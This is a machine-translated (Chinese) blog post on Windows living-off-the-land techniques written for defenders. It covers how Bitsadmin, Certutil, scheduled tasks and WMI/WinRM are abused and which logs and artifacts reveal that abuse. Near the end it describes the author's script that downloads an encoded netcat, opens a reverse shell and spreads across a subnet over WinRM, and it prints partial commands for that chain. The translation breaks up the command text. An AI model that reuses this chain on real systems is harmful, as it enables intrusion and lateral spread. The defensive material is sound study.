<html>
<head>
<title>Living Off The Land: Suspicious System32</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">靠土地生活:可疑的系统32</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/living-off-the-land-suspicious-system32-6ad8d8119fe1?source=collection_archive---------3-----------------------#2022-01-21">https://infosecwriteups.com/living-off-the-land-suspicious-system32-6ad8d8119fe1?source=collection_archive---------3-----------------------#2022-01-21</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/48ffd3fcbe0e3974cbc344009b767491.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*DZZ-mOcCO8qIjc_D"/></div></div></figure><p id="a313" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">以下服务是恶意方最常滥用的一些服务。每个都内置于Windows中，默认情况下继承信任。因此，安全控制将永远无法在不影响操作系统的情况下完全隔离它们。例如，您的端点保护不能阻止命令提示符和Powershell，因为工程师使用它们来执行自动化任务，也不能阻止任务调度器或certuitl。这些都是重要的服务，发挥着自己的作用，但是，因为它们可以下载或解码文件，它们可以用来掩盖恶意活动。</p><p id="4d72" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">下面，我们深入一些最常见的服务，以及它们是如何在野外使用的。我还试图展示如何识别可疑活动，或者至少意识到它们。我认为意识到这一点是一个好的开始，尤其是如果你是蓝队。</p><p id="453f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我眼中的关键是开始审计Powershell和命令行。尽管这些攻击中的一些作为宏运行，或在运行(浏览器)下运行，他们仍然依靠cmd.exe，conhost.exe或Powershell来实现他们的目标。对于其他人来说，审计通常是默认启用的，它只是记录的详细程度，并没有给出很多清晰度。</p><h1 id="ed40" class="kz la it bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">Bitsadmin.exe</h1><p id="5989" class="pw-post-body-paragraph kb kc it kd b ke lx kg kh ki ly kk kl km lz ko kp kq ma ks kt ku mb kw kx ky im bi translated">Bitsadmin是一个命令行工具，允许您创建下载和上传文件的作业。正因为如此，它成为下载有效载荷或横向移动所需文件的完美工具。</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mc"><img src="../Images/ae3b4d7218b20d1cd6f116f675d23e66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*XR0M6TDNOux4jLQr"/></div></div></figure><p id="2bd2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这通常可以立即爆发或运行。从所看到的示例来看，在对文件或当前环境进行“检查”之后，构建并运行作业。与Certutil不同，Windows Defender不会阻止下载。下面是一个即时作业的示例:</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mh"><img src="../Images/ff04921c6fde159216dd0f95bbadd5a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*HGH55_XwCQEVKx7w"/></div></div></figure><p id="f188" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这可以分步骤进行:</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mi"><img src="../Images/a659cf07cf068dd8b36533c14c6d716e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*oQDBm9wMz80oA54N"/></div></div></figure><p id="f343" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">Powershell也有它唯一的模块叫做<strong class="kd iu"> Start-BitsTransfer </strong>。这个模块还可以让你一次下载多个文件，使用:<br/><em class="mj">Start-bits transfer-Source C:\ client Source dir *。txt-Destination c:\ client dir \-transfer type下载</em></p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mk"><img src="../Images/7f8ca8200e692fb823ed7446a6aed818.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xwAmaPa8TmXuUtxZ"/></div></div></figure><p id="67bd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">运行Procmon时，cmd、conhost和Powershell都与以下内容进行交互:</p><ul class=""><li id="be76" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">c:\ Windows \ System32 \ bits admin . exe</li><li id="8878" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ en-GB \ bits admin . exe . mui</li><li id="674b" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ sys wow 64 \ en \ bits admin . exe . mui</li></ul><p id="895a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">Svchost.exe也写入C:\Windows\prefetch\BITSADMIN。EXE-*</p><p id="d895" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">默认情况下，在Bitsadmin的Windows事件中还有一个启用的审核跟踪。日志清楚地显示了下载的内容。</p><ul class=""><li id="fdd3" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">微软-视窗-Bits-客户端/操作</li></ul><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/55fc2dba71c492f045e28d6721cbdb93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*_cfGv2LZoG7UorHy"/></div></div></figure><p id="1d2d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">记住，攻击者会隐藏他们的踪迹。因为Bitsadmin提供了这种详细程度，所以它们可能会被删除。由于缺乏知识或者因为删除它们不会影响安全/应用程序事件，这可能会被忽略。</p><p id="24e3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">HackingArticles.in在Bitsadmin上做了一篇很好的文章，可以在这里找到:<a class="ae na" href="https://www.hackingarticles.in/windows-for-pentester-bitsadmin/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/windows-for-pentester-bits admin/</a></p><h1 id="537b" class="kz la it bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">Certutil.exe</h1><p id="1883" class="pw-post-body-paragraph kb kc it kd b ke lx kg kh ki ly kk kl km lz ko kp kq ma ks kt ku mb kw kx ky im bi translated">Certutil.exe是一个命令行程序，作为证书服务的一部分安装。Certutil可用于编码、解码和下载文件到主机上。在野外，文件已经被编码，所以它实际上是为了解码和下载。</p><p id="35c7" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">从例子来看，更是如此，解码为<em class="mj">certutil-URL cache-split-f</em>经常被AV阻止。</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nb"><img src="../Images/9d98d015aa1d9e1005138e9a0c2412dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xSnb_WeYFl9lRD9d"/></div></div></figure><p id="27f6" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">以下是禁用AV时的一个示例:</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nc"><img src="../Images/d5b87482b8bd5ced3f40ef2cf752ff40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*HpOQYNRkQ2CMW9fN"/></div></div></figure><p id="cd4d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦我们重新启用Defender，它就会被阻止。值得注意的是，并不是所有的EPs都选择这项活动。</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nd"><img src="../Images/4299fbb05f8feadf5e9d236d92a7f464.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*IPIyvfKd06u0kr4n"/></div></div></figure><p id="d2b1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用Procmon进行跟踪时，我们可以看到Powershell、conhost和cmd都接触到以下内容:</p><ul class=""><li id="5bac" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">c:\ Windows \ system32 \ certutil . exe</li><li id="de96" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ system32 \ certutil . exe . *</li><li id="f89e" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">C:\Windows\certutil.exe</li><li id="d395" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows NT \当前版本\图像文件执行选项\certutil.exe</li></ul><p id="b53b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">Certutil已经被滥用了一段时间，很可能是Defender等EP屏蔽它的原因。一些常见的建议是经常阻止可执行文件访问互联网。</p><p id="4f15" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">更多信息，SentinelOne在这里做了一篇很好的文章:<a class="ae na" href="https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/" rel="noopener ugc nofollow" target="_blank">https://www . sentinel one . com/blog/malware-living-off-land-with-certutil/</a></p><p id="c84d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我还在这里介绍了一些基础知识:</p><p id="59c0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><a class="ae na" href="https://www.youtube.com/watch?v=wu5FtdvlsHE" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=wu5FtdvlsHE</a></p><h1 id="48ee" class="kz la it bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">Tasksche</h1><p id="e5eb" class="pw-post-body-paragraph kb kc it kd b ke lx kg kh ki ly kk kl km lz ko kp kq ma ks kt ku mb kw kx ky im bi translated">与其说是滥用服务，不如说是真正按照预期使用它。逻辑炸弹和定时攻击往往可以通过设置定时任务来进行。任务调度器还允许您将任务作为系统运行，这对于后门或反向shells非常有用。</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ne"><img src="../Images/5bb8c67ec5cf6e3beae798a9dc8d3141.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*16TA4tawSWKBNJsU"/></div></div></figure><p id="d49a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">企业内部的跟踪应该很容易，因为这些通常由组策略管理。工程师很少会使用Powershell或CMD来创建计划任务，因此很容易在SIEM中进行跟踪。</p><p id="f47b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用Procmon，我们可以看到Powershell和cmd touch:</p><ul class=""><li id="8c5c" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">c:\ Windows \ System32 \ schtasks . exe</li><li id="5c6d" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ Modules \ scheduled tasks</li><li id="a5f0" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows NT \ CurrentVersion \图像文件执行选项\schtasks.exe</li></ul><p id="447b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">默认情况下，Windows还审核以下目录下的事件:</p><ul class=""><li id="c82a" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">微软视窗任务调度/操作</li></ul><h1 id="4cab" class="kz la it bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">Windows管理规范(WMI)和WS-Management (Wsman/Winrm)</h1><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nf"><img src="../Images/ff90acdf8b3f135cf7f59294dfd7a849.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*7wwLU2qvbLntRkhv"/></div></div></figure><p id="195a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">WMI是一个巨大的主题，我只涉及其中的一小部分。当远离陆地生活时，你可以用WMI和Wsman做很多事情，但最常见的是在本地或远程运行命令或可执行文件。</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ng"><img src="../Images/bb9426bdf9283a54f20fbf65a4e7632e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*n7ud0y3MaNXZE_UL"/></div></div></figure><p id="f4d3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当运行远程命令时，它将触及Wsman/WinRm服务。这在运行Powershell命令时使用，例如<strong class="kd iu"> New-PSSession </strong>或<strong class="kd iu">Invoke-Command-computer name machine-1-script block { hostname }-Credential $ a</strong>。当远程侦察正在运行，你拿起审计线索。它可能表示入侵者，而不是自动脚本。</p><p id="5021" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">您可以获得许多信息，例如，远程机器防病毒解决方案:</p><figure class="md me mf mg gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nh"><img src="../Images/f0dd69fc28633b6a124b38a640385bd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*gkRMkoE01EtDnxYq"/></div></div></figure><p id="ef7f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">针对这些命令中的大多数运行Procmon时，我可以看到Powershell和cmd与以下内容进行交互:</p><ul class=""><li id="d26b" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">HKLM \软件\策略\微软\ Windows \ WinRM \服务</li><li id="e6d5" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\策略\ Microsoft \ Windows \ WinRM \ Client</li><li id="3a0f" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows \当前版本\ WSMAN \客户端</li><li id="94cc" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\ Microsoft \ Windows \ current version \ ws man \ Client \ backwardscompatibleencryption format</li><li id="5560" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ WBEM \ wmic . exe</li><li id="1c02" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\ Microsoft \ Windows \ current version \ ws man \ Client \ auth _ negotiate</li><li id="95e7" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows \当前版本\WSMAN</li><li id="ccfd" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ WBEM \ en-US \ wmi utils . dll . mui</li><li id="bf21" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKCU \软件\微软\ Windows \ current version \ ws man \ Client \ connection cookies \ http://localhost:5985/ws man？PSVersion=*</li><li id="b480" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows \当前版本\ WSMAN \客户端\可信主机</li><li id="47e0" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\ Microsoft \ Windows \ current version \ ws man \ Client \ auth _ Kerberos</li><li id="89b4" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\ Microsoft \ Windows \ current version \ ws man \ Client \ auth _ negotiate</li><li id="4003" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows \当前版本\ WSMAN \客户端\auth_basic</li><li id="0050" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\ Microsoft \ Windows \ current version \ ws man \ Client \ allow _ encrypted</li><li id="4e25" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">HKLM \软件\微软\ Windows \ current version \ ws man \ Client \ default ports _ http</li><li id="260c" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ en-GB \ Microsoft。WSMan.Management.resources.exe</li><li id="a9d7" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ en-GB \ Microsoft。ws man . management . resources \ Microsoft。WSMan.Management.resources.dll</li><li id="b007" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ Modules \ Microsoft。WSMan.Management\*</li><li id="3da8" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ ws man。Format.ps1xml</li><li id="4ecb" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">c:\ Windows \ System32 \ Windows powershell \ v 1.0 \ Modules \ Microsoft。WSMan.Management\Microsoft。WSMan.Management.psd1</li></ul><p id="7d14" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在Powershell审核之外，您还应该能够在此处看到Windows事件:</p><ul class=""><li id="1e11" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">微软-视窗-视窗远程管理/操作</li><li id="f11e" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">微软-视窗-WMI-活动/操作</li><li id="7906" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">微软视窗分布式通讯</li></ul><p id="a681" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们刚刚讨论的是最常见和最基本的攻击。从大量滥用上述服务的例子来看，如果Windows防火墙限制他们的互联网访问，大多数服务都会受到阻碍。这是我以前接触过的东西，这里:<a class="ae na" href="https://securethelogs.com/2020/04/26/hacking-with-powershell-malware/" rel="noopener ugc nofollow" target="_blank">https://secure logs . com/2020/04/26/hacking-with-powershell-malware/</a></p><p id="22c9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我越是了解并试图理解攻击者是如何取胜的，就越是清楚审计和监控是关键。一个好的攻击者总是会找到一种方法，但只要有某种面包屑，你就有机会理解它是如何成功的。</p><p id="74dd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果你正在读这篇文章，而你从未看过这些事件，我强烈建议你去打猎。您可能找不到攻击者，但了解您环境中的正常情况是有好处的。</p><p id="94c1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">找点乐子…</p><p id="5bb7" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我想我会建立一个攻击，并结合不同的技术来获得一个反向外壳。这个我叫NetCatnRun，这里就不分享了。</p><p id="c5b2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">该脚本基本上下载了一个编码的Netcat，并向攻击者的机器查询监听端口。一旦它有了一个，它就等待，然后在那个端口上建立一个反向shell。</p><p id="8979" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦完成，使用我的“受损帐户”，它扫描子网打开WinRm端口，并运行测试，看看它是否可以连接。如果可以，它会在远程机器上重新开始这个过程。当击中X.X.X.254时，这就结束了。如果我想进一步复制并创建一个蠕虫，我总是可以将IP范围扩展到/24以上。</p><p id="507d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><a class="ae na" href="https://videopress.com/v/scOdx0VG?resizeToParent=true&amp;cover=true&amp;preloadContent=metadata" rel="noopener ugc nofollow" target="_blank">https://videopress.com/v/scOdx0VG?resizeToParent=true&amp;cover = true&amp;preload content = metadata</a></p><p id="fa8b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当Defender运行并使用上面提到的一些服务时，这种攻击是成功的。</p><p id="31a8" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><em class="mj">Start-bits transfer-Source</em>'<em class="mj">https://raw . githubusercontent . com/secure logs/Powershell/master/Tools/NC . exe '-Destination $ env:TEMP \ NC . exe . txt</em></p><p id="ca33" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><em class="mj">certutil-decode $ env:TEMP \ NC . exe . txt $ env:TEMP \ NC . exe</em></p><p id="a3c7" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><em class="mj">$ is live = Test-ws man $ current IP-Credential $ my Credential-authentic ation Negotiate-error action</em></p><p id="0037" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><em class="mj">silently continue invoke-Command-computer name $ current tip-Credential $ my Credential-script block {………………。} </em></p><h2 id="ffe7" class="ni la it bd lb nj nk dn lf nl nm dp lj km nn no ln kq np nq lr ku nr ns lv nt bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae na" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>